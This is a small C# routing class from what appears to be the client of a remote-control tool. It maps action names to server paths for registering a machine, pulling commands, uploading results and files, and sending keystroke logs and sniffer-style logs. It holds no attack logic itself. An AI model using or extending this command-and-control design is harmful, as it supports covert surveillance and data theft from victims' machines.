using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC
{
    public class Router
    {
        public static Dictionary<String, String> path = new Dictionary<String, String>();

        /*public static string url(string conn, bool addTok = true)
        {
            string param = string.Empty;
            if (addTok)
            {
                if (conn.Contains("?"))
                {
                    param = "&";
                }
                else
                {
                    param = "?";
                }
                param += "token=" + Parametre.API_KEY;
            }
            return Parametre.URL + path[conn] + param;
        }*/
        public static string url(string conn)
        {
            string param = string.Empty;
            return Parametre.URL.TrimEnd('/') + "/" + path[conn] + param;
        }

        public static void load()
        {
            path.Add("auth", "machines");
            path.Add("get_command", "commands");
            path.Add("send_result", "results");
            path.Add("send_file", "medias");
            path.Add("get_file", "medias/get/");
            path.Add("send_service_result", "medias");

            path.Add("post_snf", "logs");
            path.Add("send_service", "medias");
            path.Add("send_keylog", "medias");
        }
    }
}
